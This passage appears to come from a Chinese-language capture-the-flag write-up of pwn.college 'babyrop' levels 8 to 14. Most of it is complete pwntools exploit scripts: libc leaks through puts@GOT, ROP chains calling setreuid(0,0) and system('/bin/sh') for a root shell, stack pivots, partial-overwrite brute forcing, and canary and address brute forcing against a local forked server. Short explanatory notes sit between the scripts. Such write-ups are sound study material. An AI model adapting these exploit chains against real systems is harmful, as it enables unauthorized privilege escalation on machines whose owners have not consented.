这里可以直接换成read指令所在的地址，因为我们没有修改rbp</span><br>e = p.elf<br>r = ROP(e)<br>r.raw(r.rdi)<br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(challenge_addr)<br>payload = padding + r.chain()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;Leaving!\n&#x27;</span>)<br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_got_addr))<br>libc.address = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr&quot;</span>, <span class="hljs-built_in">hex</span>(libc.address))<br><br><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br>payload = padding + rop.chain()<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level8-1-1"><a href="#level8-1-1" class="headerlink" title="level8.1"></a>level8.1</h4><p>改一下padding以及challenge的地址就行</p><h4 id="level9-0-2"><a href="#level9-0-2" class="headerlink" title="level9.0"></a>level9.0</h4><p>有点小麻，由于长时间尝试返回地址为challenge，导致栈迁移后大概率会出现问题。因为进入challenge时会创建新的函数栈帧，而这个栈帧会导致后面的printf函数出现空指针的错误，因此，我一直在尝试解决这个问题，修复栈修复到我要原地爆炸！最后还是妥协，返回地址设置成read函数那儿，从而一下就能出来，因为栈没有变，迁移后的栈是我们可控的。</p><p>buf_addr: <code>0x4150e0</code>，需要用leave指令把栈迁移到bss段的可写段。我开辟了一个rsp-&gt;<code>0x4150f8</code>然后rbp-&gt;<code>0x415140</code>这么样的一个新栈帧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level9.0&quot;</span>)<br><span class="hljs-comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><span class="hljs-comment"># padding = b&#x27;a&#x27;*0x48</span><br>read_addr = p64(<span class="hljs-number">0x402257</span>)  <br>e = p.elf<br>r = ROP(e)<br><span class="hljs-comment"># buf_addr = 0x415100</span><br>r.raw(r.rbp)<br>r.raw(<span class="hljs-number">0x4150f8</span>)<br>r.raw(r.leave)<br>r.raw(<span class="hljs-number">0x415140</span>)<br>r.raw(r.rdi)<br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(read_addr)<br>payload = r.chain()<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;Leaving!\n&#x27;</span>)<br><span class="hljs-comment"># printf_got_addr = p.recv(6)</span><br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_got_addr))<br>libc.address = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr&quot;</span>, <span class="hljs-built_in">hex</span>(libc.address))<br><br><span class="hljs-comment"># p.send(payload)</span><br><span class="hljs-comment"># libc.address = sys_addr - libc.symbols[&#x27;system&#x27;]</span><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">56</span><br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + rop.chain()<br>pause()<br>p.send(payload)<br><br><span class="hljs-comment"># print(p.recvall())</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level9-1-2"><a href="#level9-1-2" class="headerlink" title="level9.1"></a>level9.1</h4><p>只用改buf的地址以及read的地址即可。</p><h4 id="level10-0-2"><a href="#level10-0-2" class="headerlink" title="level10.0"></a>level10.0</h4><p>这题依然是栈迁移，需要细细分析。leave指令的作用。并且需要查看win函数地址存放在栈的哪里。</p><blockquote><p><code>leave = mov rbp, rsp; pop rbp;</code></p></blockquote><p>基于leave指令的特性，可以覆盖rbp的值，使其在栈中迁移。因为challenge函数在ret前会有一次leave。所以可以迁移rbp指令至win函数地址-8的位置。为什么要减去8？分析stack(win) - 8（这表示win函数地址的栈地址并减去8）的情形：</p><p>当修改rbp地址的存储为stack(win)-8后，正常执行结束challenge函数，那么会执行一次leave指令。先执行<code>mov rsp, rbp</code>后：rsp此时指向stack(win)-8，再执行&#96;&#96;pop rbp&#96;后，rbp此时的地址为stack(win)-8，此时rsp指向原先rbp的地址+8，即返回地址处。</p><p>那么再执行一次leave后，还会执行<code>mov rsp, rbp</code>，此时rsp的地址为stack(win)-8。此时再执行<code>pop rbp</code>后，rbp可能已经丢失了，然后rsp为stack(win)。那么此时再执行一个ret指令，即跳转到win函数了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = process(<span class="hljs-string">&quot;/challenge/babyrop_level10.0&quot;</span>)<br>    padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: &#x27;</span>)<br>    input_buf = p64(<span class="hljs-built_in">int</span>(p.recvline().strip()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">8</span> - <span class="hljs-number">8</span>)<br><br>    payload = padding + input_buf + p16(<span class="hljs-number">0xe71e</span>)<br>    <span class="hljs-comment"># pause()</span><br>    p.send(payload)<br>    out = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;pwn&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(out)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>当然，因为题目给了win函数的地址，因此可以直接ret到那儿去。但是10.1还是要按照这种方法做的。</p><h4 id="level10-1-2"><a href="#level10-1-2" class="headerlink" title="level10.1"></a>level10.1</h4><p>该padding以及gadget偏移即可。</p><h4 id="level11-0-2"><a href="#level11-0-2" class="headerlink" title="level11.0"></a>level11.0</h4><p>如level10.1脚本，改gadget偏移</p><h4 id="level11-1-2"><a href="#level11-1-2" class="headerlink" title="level11.1"></a>level11.1</h4><p>还是改gadget偏移即可</p><h4 id="level12-0-2"><a href="#level12-0-2" class="headerlink" title="level12.0"></a>level12.0</h4><p>这题没有challenge函数了。因此，我们爆破的是main函数的返回地址。它会去到libc.so文件中。所以我们需要拿到libc.so文件中的<code>leave;ret</code>指令的偏移地址。然后爆破。这里爆破的时间就有点长了，因为偏移地址是3个字节的长度。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">from</span> pwn import *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-keyword">while</span> True:<br>    p = process(<span class="hljs-string">&quot;/challenge/babyrop_level12.1&quot;</span>)<br>    padding = b<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x48</span><br>    p.recvuntil(b<span class="hljs-string">&#x27;located at: &#x27;</span>)<br>    input_buf = p64(<span class="hljs-built_in">int</span>(p.recvline().strip()[:<span class="hljs-number">-1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">8</span> - <span class="hljs-number">8</span>)<br>    payload = padding + input_buf + p16(<span class="hljs-number">0x18c8</span>) + p8(<span class="hljs-number">0x73</span>)<br>    <span class="hljs-meta"># pause()</span><br>    p.send(payload)<br>    <span class="hljs-keyword">out</span> = p.recvall(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;pwn&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">out</span>:<br>        <span class="hljs-function"><span class="hljs-keyword">break</span></span><br><span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-params"><span class="hljs-keyword">out</span></span>)</span><br><span class="hljs-function">p.<span class="hljs-title">interactive</span>()</span><br></code></pre></td></tr></table></figure><p>记得<code>p.recvall(1)</code>，设置一下超时时间，因为爆破过程中很有可能会去到libc.so中某个有效地址，从而导致程序hang out，那么你就得重新开始跑。这样的话，重复执行exp多次也不一定能够爆破出来。</p><h4 id="level12-1-2"><a href="#level12-1-2" class="headerlink" title="level12.1"></a>level12.1</h4><p>上面的exp直接跑</p><h4 id="level13-0-2"><a href="#level13-0-2" class="headerlink" title="level13.0"></a>level13.0</h4><p>这题所有保护都开了，但是题目给了LEAK，让我们泄露canary。泄露出来后，需要覆盖最低的一个字节，让它返回到<code>call main</code>的前面，然后重新执行一遍main，此时再泄露ret地址，因为ret地址减去固定偏移就是<code>libc_base</code>的地址，这样就可以进行ROP了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>p = process(<span class="hljs-string">&quot;/challenge/babyrop_level13.0&quot;</span>)<br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x78</span><br><br><span class="hljs-comment"># stage_one</span><br>p.recvuntil(<span class="hljs-string">b&#x27;located at: &#x27;</span>)<br>input_buf = <span class="hljs-built_in">int</span>(p.recvline().strip()[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>canary_addr = input_buf + <span class="hljs-number">0x78</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;from:\n&#x27;</span>, <span class="hljs-built_in">hex</span>(canary_addr).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>p.recvuntil(<span class="hljs-string">b&#x27; = &#x27;</span>)<br>canary = p.recvline().strip()<br>canary = <span class="hljs-built_in">int</span>(canary, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br>payload = padding + p64(canary) + p64(<span class="hljs-number">0x00</span>) + p8(<span class="hljs-number">0x60</span>)<br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br><br><br><span class="hljs-comment"># stage_two</span><br>ret_libc_addr = input_buf + <span class="hljs-number">0x88</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;from:\n&#x27;</span>, <span class="hljs-built_in">hex</span>(ret_libc_addr).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>p.recvuntil(<span class="hljs-string">b&#x27; = &#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>) - <span class="hljs-number">0x24083</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base:&quot;</span>, libc_base)<br>libc.address = libc_base<br><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) + rop.chain()<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="level13-1-2"><a href="#level13-1-2" class="headerlink" title="level13.1"></a>level13.1</h4><p>改偏移地址，三个地方：<code>padding</code>，<code>canary_addr</code>，<code>ret_libc_addr</code></p><h4 id="level14-0-2"><a href="#level14-0-2" class="headerlink" title="level14.0"></a>level14.0</h4><p>这题有fork，那大概率是爆破了。思路是，先爆破canary，再爆破main函数的基地址，然后再利用main的基地址进行<code>plt.puts(got.puts)</code>泄露libc基地址，然后根据libc基地址拿到shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x58</span><br><br><span class="hljs-comment"># stage_one: leak canary</span><br>x = <span class="hljs-number">0x00</span><br>tmp = <span class="hljs-string">b&#x27;&#x27;</span><br>canary = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    tmp = canary<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        x = <span class="hljs-number">0</span><br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + tmp<br>    <span class="hljs-built_in">print</span>(payload)<br>    p.sendafter(<span class="hljs-string">b&#x27;scenario.\n&#x27;</span>, payload)<br>    out = p.recvall()<br>    <span class="hljs-comment"># print(out)</span><br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;smashing detected ***: terminated&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> out:<br>        canary += y<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(canary) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        x = <span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(canary)))<br>pause()<br><br><span class="hljs-comment"># stage_two: leak main_addr</span><br>x = <span class="hljs-number">0x01</span><br>tmp = <span class="hljs-string">b&#x27;&#x27;</span><br>main_addr = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>    tmp = main_addr<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">255</span>:<br>        x = <span class="hljs-number">0</span><br>    y = p8(x)<br>    x += <span class="hljs-number">1</span><br>    tmp += y<br>    payload = padding + canary + p64(<span class="hljs-number">0xdeadbeef</span>) + tmp<br>    <span class="hljs-comment"># print(payload)</span><br>    p.sendafter(<span class="hljs-string">b&#x27;scenario.\n&#x27;</span>, payload)<br>    out = p.recvall(<span class="hljs-number">1</span>)<br>    p.close()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;### Goodbye!&#x27;</span> <span class="hljs-keyword">in</span> out:<br>        main_addr += y<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(main_addr) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        x = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(main_addr)))<br>pause()<br><br><span class="hljs-comment"># stage_three: leak libc_addr</span><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>pro = process(<span class="hljs-string">&quot;/challenge/babyrop_level14.0&quot;</span>)<br>e = pro.elf<br>e.address = u64(main_addr) - <span class="hljs-number">0x1fce</span><br>r = ROP(e)<br>r.raw(r.rdi)<br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload = padding + canary + p64(<span class="hljs-number">0xdeadbeef</span>) + r.chain()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;Leaving!\n&#x27;</span>)<br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># print(hex(puts_got_addr))</span><br>libc.address = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;puts_got_addr:&quot;</span>,<span class="hljs-built_in">hex</span>(puts_got_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_addr&quot;</span>, <span class="hljs-built_in">hex</span>(libc.address))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(main_addr)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_base_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(e.address))<br><br><span class="hljs-comment"># stage_four: ROP</span><br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(u64(canary)))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-built_in">print</span>(rop.dump())<br><br>payload = padding + canary + p64(<span class="hljs-number">0x0</span>) + rop.chain()<br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1337</span>)<br>p.send(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><p>但是很神奇的是，就算canary是正确的，同样的脚本依然会出现”smashing detected ***: terminated”，所以，写一个固定的脚本多跑几次：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><br>main_addr = <span class="hljs-number">0x5c929d8dffce</span><br>canary = <span class="hljs-number">0xca03b3b9123c1900</span><br>main_base_addr = <span class="hljs-number">0x5c929d8de000</span><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x58</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>pro = process(<span class="hljs-string">&quot;/challenge/babyrop_level14.0&quot;</span>)<br><br>e = pro.elf<br>e.address = main_base_addr<br>r = ROP(e)<br>r.raw(r.rdi)<br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><span class="hljs-built_in">print</span>(r.dump())<br><br>libc.address = <span 